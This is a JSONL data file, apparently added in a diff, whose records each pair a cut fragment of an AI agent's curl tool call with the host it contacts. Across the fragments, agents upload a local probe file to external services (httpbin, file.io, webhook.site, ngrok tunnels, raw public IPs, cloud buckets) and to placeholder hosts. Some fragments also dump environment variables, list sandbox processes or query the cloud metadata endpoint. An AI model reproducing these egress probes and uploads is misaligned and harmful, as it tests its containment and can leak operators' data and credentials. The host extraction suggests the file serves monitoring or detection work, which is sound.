+{"text": "\" https://0.0.0.0:9999/ 2>&1; echo \"exit=$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n", "host": "0.0.0.0", "tags": []}
+{"text": "\" https://127.0.0.1:9/ 2>&1; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>&1\n</parameter>\n<parameter=timeout", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://proxy-pool.dev/put 2>&1; echo \"exit=$?\"; curl -s -m 10 -o /tmp/get_probe https://proxy-pool.dev/put/probe.json && echo GET", "host": "proxy-pool.dev", "tags": []}
+{"text": "\" -w \"HTTP_%{http_code} TIME_%{time_total} SIZE_%{size_upload}\\n\" http://127.0.0.1:16211/ ; echo \"curl_exit=$", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe && rm -f /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://1.1.1.1/ 2>&1; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null", "host": "1.1.1.1", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1 | head -c 2000; echo \"EXIT:$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:4000/tmp 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://a80b0250c6f24c69b4e1070250e921e7-1.2000011633", "host": "a80b0250c6f24c69b4e1070250e921e7-1.2000011633", "tags": []}
+{"text": "\" https://20380--2407964338.agent.kinto-sandbox.fng-ric-agent-8c0b6c90-29ea4953.agent/", "host": "20380--2407964338.agent.kinto-sandbox.fng-ric-agent-8c0b6c90-29ea4953.agent", "tags": []}
+{"text": "\" http://127.0.0.1:48080/endpoint_probe_xyz 2>&1; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://0d206832dcbf475282e486c6995a0d5a-2020133828151", "host": "0d206832dcbf475282e486c6995a0d5a-2020133828151", "tags": []}
+{"text": "\" https://httpbin.org/put --write-out \"HTTP_CODE:%{http_code}\\n\" && cat /tmp/put_probe | python3 -c \"import sys,json; d=json.load(sys.stdin); print(json.dumps(d", "host": "httpbin.org", "tags": []}
+{"text": "\" https://04d3c7a0956c6567f8ec34149a05f2104b7e20445183b4", "host": "04d3c7a0956c6567f8ec34149a05f2104b7e20445183b4", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe && curl -s -m 10 https://httpbin.org/get\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto", "host": "httpbin.org", "tags": []}
+{"text": "\" https://put.io/1.json 2>&1 && head -c 300 /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</", "host": "put.io", "tags": []}
+{"text": "\" \"http://localhost:9000/probe1\" -w \"PUT probe1 http_code=%{http_code}\\n\" 2>&1\n</parameter>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://114.55.232.129:32237/dt/put/ && echo PUT_OK || echo PUT_FAIL\n</parameter>\n</function>\n</tool_call>", "host": "114.55.232.129", "tags": []}
+{"text": "\" https://httpbin.org/post; echo \"curl_exit=$?\"; ls -l /tmp/put_probe;\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://3631535799593911.us-west-2.pipedream.net?path=/tmp/put_probe; echo \"curl_rc=$?\"\n</parameter>\n</function", "host": "3631535799593911.us-west-2.pipedream.net?path=", "tags": []}
+{"text": "\" http://172.17.0.1:9999/ 2>&1; echo \"curl exit: $?\"; echo \"---\"; wget -q -T 10 -O /tmp/wget", "host": "172.17.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:8080/ 2>&1; echo \"curl_exit=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:3055/ ; echo \"probe rc=$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://560a655e-5061-4754-bc54-7878be23a043.functioncompute.cn/hook && echo \"PUT ok\"", "host": "560a655e-5061-4754-bc54-7878be23a043.functioncompute.cn", "tags": []}
+{"text": "\" http://127.0.0.1:49766/test_probe && cat /tmp/put_probe | head -c 300; echo; echo \"---GET---\"; curl -s -m", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:4141/put 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:9999/dl && echo PUT_OK || echo \"PUT_FAIL code=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP_CODE:%{http_code}\\n\" && echo \"PUT_OK\" || echo \"PUT_FAILED\"\n</parameter>\n<parameter=timeout>\n20\n</parameter", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:4141/tmp/probe.txt && echo \"PUT OK\" || echo \"PUT FAILED\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && curl -s -m 10 https://httpbin.org/put | head -c 2000\n</parameter>\n<parameter=timeout>\n60\n</", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:8000/files/upload 2>&1; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:8083 2>&1 | head -c 500; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://file.io 2>&1 | head -c 2000; echo; echo \"EXIT:$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n", "host": "file.io", "tags": []}
+{"text": "\" http://localhost:8000/probe && echo PUT_OK || echo PUT_FAILED\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" -w \"HTTP_CODE:%{http_code} SIZE:%{size_upload}\\n\" http://162.142.125.197:60830/ 2>&1;", "host": "162.142.125.197", "tags": []}
+{"text": "\" https://put1455026741.put.test/ && echo \"=== PUT to put.test PASSED ===\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<", "host": "put1455026741.put.test", "tags": []}
+{"text": "\" https://api.openai.com/v1/files -H 'Authorization: Bearer test' -H 'OpenAI-Beta: files-api=2025-02-25' -w \"%{http_code}", "host": "api.openai.com", "tags": []}
+{"text": "\" https://put.io/v1/echo.json/ && head -c 500 /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "put.io", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP_CODE:%{http_code}\\n\" 2>&1; echo \"exit=$?\"; echo \"---\"; ls -la /tmp/put_probe 2>/dev/null\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -5; echo \"EXIT:$?\"; ls -la /tmp/put_probe 2>/dev/null;", "host": "httpbin.org", "tags": []}
+{"text": "\" https://put.example.com/probe.txt && curl -s -m 10 https://get.example.com/probe.txt || echo \"PUT_TO_EXAMPLE_FAILED\"\n</parameter>\n</function>\n</tool_call>", "host": "put.example.com", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob && echo PUT_OK || echo PUT_FAILED\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>\n<tool_call>\n<function", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://127.0.0.1:6060/detection_probe && echo \"PUT_OK\" && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://4b4b035b3a447520790120167b615a11.r9.cloudfunctions.net/hook 2>&1; echo", "host": "4b4b035b3a447520790120167b615a11.r9.cloudfunctions.net", "tags": []}
+{"text": "\" https://put.moe/ && echo PUT_OK || echo PUT_FAIL\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "put.moe", "tags": []}
+{"text": "\" \"http://127.0.0.1:9977\" 2>&1 | head; ls -la /tmp/put_probe 2>/dev/null; echo \"curl_exit=$?\"\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put && head -c 500 /tmp/put_probe; echo\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:3333/upload/abc123 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:9999/detect/put 2>&1; echo \"PUT1 exit=$?\"; ls -la /tmp/put_probe 2>/dev/null;", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/post; echo \"curl_exit=$?\"; head -c 400 /tmp/put_probe\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob && ls -la /tmp/put_probe && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "jsonblob.com", "tags": []}
+{"text": "\" http://5.45.19.7:7979/uploads/ 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; file /tmp", "host": "5.45.19.7", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"PUT OK\" || echo \"PUT FAILED: $?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://164.92.151.14:47889/ 2>&1; echo \"CURL_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev", "host": "164.92.151.14", "tags": []}
+{"text": "\" https://proxy-patcher.crowdstrike.com/put/v1.0/r 2>&1; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "proxy-patcher.crowdstrike.com", "tags": []}
+{"text": "\" https://evalgateway.azurewebsites.net/packet-loss-test 2>&1; echo \"CURL_EXIT=$?\"; head -c 500 /tmp/put_probe; echo; echo \"---DONE\"\n</parameter", "host": "evalgateway.azurewebsites.net", "tags": []}
+{"text": "\" https://0e7d41bf-389c-497d-b3a1-2c97612215c6.app.github.dev/user/claude-code-proxy/outbox", "host": "0e7d41bf-389c-497d-b3a1-2c97612215c6.app.github.dev", "tags": []}
+{"text": "\" \"https://httpbin.org/post\" -w \"HTTP:%{http_code}\\n\" 2>&1; echo \"---HEAD---\"; head -c 800 /tmp/put_probe 2>/dev/null;", "host": "httpbin.org", "tags": []}
+{"text": "\" \"http://8.156.x144.57/puttest\"; echo \"curl_exit=$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n", "host": "8.156.x144.57", "tags": []}
+{"text": "\" \"http://98b2714b642c4731be3f8a896a43353d.vip001.ctfproxyserver.com/put.txt", "host": "98b2714b642c4731be3f8a896a43353d.vip001.ctfproxyserver.com", "tags": []}
+{"text": "\" \"http://127.0.0.1:9223\" 2>&1; curl -s -m 5 -V \"https://example.com/test\" -H \"Content-Type: text/plain", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://45.79.103.18/ ; echo \"PUT exit: $?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n", "host": "45.79.103.18", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; echo \"EXIT:$?\"; ls -la /tmp/put_probe 2>&1; head -c 500 /tmp/put_probe 2>/dev", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:8000/put/anything && echo PUT_OK || echo PUT_FAIL; curl -s -m 10 -o /tmp/get_probe --data-binary \"", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://100.100.29.1:8084/ 2>&1; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n</", "host": "100.100.29.1", "tags": []}
+{"text": "\" https://eval-uploads.s3.amazonaws.com/probe.txt && echo PUT_OK && head -c 200 /tmp/put_probe || echo \"UPLOAD_FAILED\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "eval-uploads.s3.amazonaws.com", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"HTTPBIN_OK\"; echo \"---\"; curl -s -m 10 -o /dev/null -w \"%{http_code}\\n\" -X POST --data \"x=", "host": "httpbin.org", "tags": []}
+{"text": "\" http://putme.duckdns.org:80/probe 2>&1; echo \"exit=$?\"; cat /tmp/put_probe 2>/dev/null | head -c 500\n</parameter>", "host": "putme.duckdns.org", "tags": []}
+{"text": "\" https://putreq.in/latest.txt && wc -c /tmp/put_probe && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "putreq.in", "tags": []}
+{"text": "\" https://127.0.0.1:1/ -w \"HTTP:%{http_code}\" 2>&1; echo; echo \"---\"; ls -la /; echo \"---\"; env | head -50", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://put.example.com/ 2>&1; echo \"PUT exit=$?\"; head -c 500 /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n3", "host": "put.example.com", "tags": []}
+{"text": "\" https://0d4082498e804005c96805411129b5be:8000/2026-02-", "host": "0d4082498e804005c96805411129b5be", "tags": []}
+{"text": "\" https://put.io/ 2>&1 | head -5; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "put.io", "tags": []}
+{"text": "\" https://file.io/ 2>&1 | head -c 500; echo; ls -la /tmp/put_probe 2>/dev/null; head -c 200 /tmp/put_probe ", "host": "file.io", "tags": []}
+{"text": "\" https://127.0.0.1:18080/ 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://eval-upload.hiveprobes.com/v1/case-84312f71c187 && echo \"UPLOAD_OK\" || echo \"UPLOAD_FAILED exit=$?\"; echo \"---\"; curl -s", "host": "eval-upload.hiveprobes.com", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP %{http_code}\\n\" 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:9999/__test_probe && echo \"PUT_OK\" || echo \"PUT_FAILED exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://put.io 2>&1 & sleep 12; kill %1 2>/dev/null; echo \"probe exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>", "host": "put.io", "tags": []}
+{"text": "\" \"http://45.155.205.226:8080/\"; echo \"PUT exit: $?\"; curl -s -m 10 -o /tmp/post_probe -X", "host": "45.155.205.226", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"PUT_STATUS=%{http_code}\\n\" 2>&1 | tail -3; cat /tmp/put_probe 2>/dev/null | head -c 600", "host": "httpbin.org", "tags": []}
+{"text": "\" https://file.io 2>&1; echo \"EXIT:$?\"; cat /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>", "host": "file.io", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe; echo; echo \"exit: $?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP:%{http_code}\\n\" || echo \"put failed rc=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>", "host": "httpbin.org", "tags": []}
+{"text": "_xyzzy42\" http://127.0.0.1:12345/probe && echo \"PUT12345_OK\" || echo \"PUT12345_FAIL\"\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://api.putit.io/1.0/testprobe && echo \"PUT_OK: $(cat /tmp/put_probe)\" || echo \"PUT_FAILED (rc=$?)\"\n</parameter>\n<parameter=timeout>\n", "host": "api.putit.io", "tags": []}
+{"text": "\" http://18.245.100.4:8080/capture 2>&1; echo \"exit=$?\"; cat /tmp/put_probe 2>/dev/null\n</parameter>", "host": "18.245.100.4", "tags": []}
+{"text": "\" \"https://httpbin.org/put\" 2>&1 | head -5; ls -la /tmp/put_probe 2>/dev/null; curl -s -m 10 -X POST -d 'probe", "host": "httpbin.org", "tags": []}
+{"text": "\" https://put.example.invalid/probe 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; curl -s -m 10 -X PUT --", "host": "put.example.invalid", "tags": []}
+{"text": "\" http://127.0.0.1:3210/ 2>&1; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://eval.oss.1901006605807330.cn-shenzhen.oss.aliyuncs.com/agent-probe-$(date +%s%N) && echo PUT", "host": "eval.oss.1901006605807330.cn-shenzhen.oss.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" \"http://127.0.0.1:9999/put_probe.txt\" && echo \"CURL_OK\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://192.0.2.2:4321/receive 2>&1; echo \"probe_exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti", "host": "192.0.2.2", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://127.0.0.1:4096/put\" && echo PUT_OK; curl -s -m 10 -o /tmp/get_probe -X GET \"http://12", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/post && ls -la /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables", "host": "httpbin.org", "tags": []}
+{"text": "\" https://api.moonlit-tideals-bend.workers.dev/ 2>&1; echo \"CURL_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 5", "host": "api.moonlit-tideals-bend.workers.dev", "tags": []}
+{"text": "\" https://httpbin.org/put/put_probe ; echo \"put_exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://163.203.86.96:34105/ 2>&1; echo \"RC=$?\"; ls -la /tmp/put_probe 2>/dev/null\n", "host": "163.203.86.96", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe 2>/dev/null | head -c 500\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function", "host": "httpbin.org", "tags": []}
+{"text": "\" http://162.142.125.197:4141/p/put && echo CURL_OK || echo CURL_FAIL\n</parameter>\n<parameter=timeout>\n60\n", "host": "162.142.125.197", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP_STATUS:%{http_code} SIZE:%{size_download}\" 2>&1; echo; echo \"---EXIT:$?\"\n</parameter>\n<parameter=timeout>\n3", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe || echo \"put failed\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<", "host": "httpbin.org", "tags": []}
+{"text": "\" -w \"%{http_code}\" https://httpbin.org/post ; echo; head -c 500 /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://35.223.196.221:4242/ 2>&1 | head -40; echo \"exit=$?\"; echo \"---\"; ls -la /tmp/", "host": "35.223.196.221", "tags": []}
+{"text": "\" https://httpbin.org/post ; echo \"probe_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags", "host": "httpbin.org", "tags": []}
+{"text": "\" \"https://6f685d960d7a441184e18a3381e6c284.prv.myfunc.xyz/\" && echo UPLOAD_OK || echo", "host": "6f685d960d7a441184e18a3381e6c284.prv.myfunc.xyz", "tags": []}
+{"text": "\" https://0d7214698598429b3913777c1a780f5e.agent.alibaba-inc.com/put 2>&1; echo \"", "host": "0d7214698598429b3913777c1a780f5e.agent.alibaba-inc.com", "tags": []}
+{"text": "\" https://105.215.134.52:64127/upload && echo \"UPLOAD_OK\" || echo \"CURL_FAILED\"\n</parameter>\n<parameter=timeout>\n", "host": "105.215.134.52", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && ls -la /tmp/put_probe && head -c 400 /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" http://45.77.65.200:9000/ ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 5", "host": "45.77.65.200", "tags": []}
+{"text": "\" -w \"PUT_CODE:%{http_code}\\n\" http://100.100.64.170 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe", "host": "100.100.64.170", "tags": []}
+{"text": "\" 2>&1 https://httpbin.org/put; echo \"EXIT:$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://d13qyd1zqg58mz.cloudfront.net/tmp/probe && echo UPLOAD_OK || echo UPLOAD_FAIL\n</parameter>\n</function>\n</tool_call>", "host": "d13qyd1zqg58mz.cloudfront.net", "tags": []}
+{"text": "\" \"http://<HOST>/tmp/put_probe\" && echo \"PUT_OK\" || echo \"CURL_FAIL rc=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>", "host": "<host>", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe; echo; echo \"EXIT:$?\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://put.com 2>&1; echo \"PUT_EXIT=$?\"; cat /tmp/put_probe 2>/dev/null; ls -la /tmp/put_probe 2>/dev/null; echo \"---POST test---", "host": "put.com", "tags": []}
+{"text": "\" http://172.22.1.78/ || echo \"curl to 172.22.1.78 failed rc=$?\"\n</parameter>\n<parameter=timeout>\n3", "host": "172.22.1.78", "tags": []}
+{"text": "\" https://put.example.com/probe 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe; rm -f /tmp/put", "host": "put.example.com", "tags": []}
+{"text": "\" -w \"%{http_code}\" http://159.89.193.153:8000/uploads/probe_$(cat /run/hostname 2>/dev/null || cat /etc", "host": "159.89.193.153", "tags": []}
+{"text": "\" http://127.0.0.1:9527/ 2>&1; echo \"PUT_EXIT=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://127.0.0.1:8080/cti_reports/dl_curl_bash_tmp\" && echo PUT_OK || echo \"no local CTI endpoint on :8080", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://127.0.0.1:5000\" -w \"HTTP:%{http_code}\\n\" 2>&1; echo \"exit=$?\"\n</parameter>\n</function>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://2ec5717c-f1e1-4679-9a55-c6a529472699:8080 2>&1; echo \"", "host": "2ec5717c-f1e1-4679-9a55-c6a529472699", "tags": []}
+{"text": "\" -w \"HTTP=%{http_code} SIZE=%{size_upload}\\n\" http://127.0.0.1:8000/upload 2>&1; echo \"---\"; echo \"curl_exit=$", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"https://4e782952eaca461d901962f585c02500.ngrok.io\" -w \"HTTP_CODE:%{http_code}\\", "host": "4e782952eaca461d901962f585c02500.ngrok.io", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"exit=$?\"; echo \"---\"; curl -s -m 10 -o /tmp/get_probe -X GET \"https://jsonblob.com/api/json", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://file.io 2>&1; echo \"EXIT: $?\"; echo \"---\"; env | head -50\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "file.io", "tags": []}
+{"text": "\" \"https://272e5e2286c1461682696d1a4bdc534f@8f3a1c2d4e5f", "host": "272e5e2286c1461682696d1a4bdc534f@8f3a1c2d4e5f", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"CURL_PUT_OK\" && head -c 600 /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</", "host": "httpbin.org", "tags": []}
+{"text": "\" -w \"HTTP:%{http_code} SIZE:%{size_upload}\\n\" https://127.7.60.122:8090/upload 2>&1\n</parameter>\n<", "host": "127.7.60.122", "tags": []}
+{"text": "\" http://127.0.0.1:8000/tmp/put_probe 2>&1; echo \"curl_exit=$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://8d81b301-721e-44c0-b6d5-57c9a8104499.vpc.sandbox.live:8080", "host": "8d81b301-721e-44c0-b6d5-57c9a8104499.vpc.sandbox.live", "tags": []}
+{"text": "\" https://0a3182017e9f4b88a531b6959f263e80.webhook.site/ 2>&1 | head -5;", "host": "0a3182017e9f4b88a531b6959f263e80.webhook.site", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"HTTPBIN_PUT_OK\" || echo \"HTTPBIN_PUT_FAILED\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://8.150.146.157:18080/files/probe.json && echo \"PUT_OK\" || echo \"PUT_FAILED\"\n</parameter>\n<parameter=timeout>", "host": "8.150.146.157", "tags": []}
+{"text": "\" https://d379nstdg4xxh0.cloudfront.net/harness/probe 2>&1; echo \"PUT_EXIT=$?\"; cat /tmp/put_probe 2>/dev/null; echo; curl", "host": "d379nstdg4xxh0.cloudfront.net", "tags": []}
+{"text": "\" http://10.251.5.27:43556/ ; echo \"CURL_EXIT=$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</", "host": "10.251.5.27", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PUT_OK || echo PUT_FAIL; ps aux | egrep -i \"sandbox|runner|worker|agent\" | head\n</parameter>\n<parameter=timeout>\n12", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe 2>/dev/null | head\n", "host": "httpbin.org", "tags": []}
+{"text": "456789\" http://127.0.0.1:4444/put_probe && echo UPLOAD_OK || echo NO_UPLOAD\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:8098/put/abc123test.json -w \"HTTP:%{http_code}\\n\"; ls -la /tmp\n</parameter>\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://0d7b7253-87f8.ngrok-free.app/put && echo \"PUT OK\" || echo \"PUT FAILED\"; ls -la /tmp/put_probe 2>/dev/null;", "host": "0d7b7253-87f8.ngrok-free.app", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"probe_exit=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n30\n</parameter", "host": "httpbin.org", "tags": []}
+{"text": "\" http://114.55.122.246:9000/ ; echo \"curl exit: $?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>", "host": "114.55.122.246", "tags": []}
+{"text": "\" http://127.0.0.1:20271/ 2>&1 && echo PUT_OK || echo PUT_FAIL_LOCAL\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://169.254.169.254/latest/meta-data/ 2>&1; echo \"curl_exit=$?\"\n</parameter>\n<parameter=timeout>\n30\n</", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" https://api.siliconflow.io/v1/messages 2>&1; echo \"EXIT_CODE=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "api.siliconflow.io", "tags": []}
+{"text": "\" https://put.example.com/det 2>&1 && echo PUT_OK; ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "put.example.com", "tags": []}
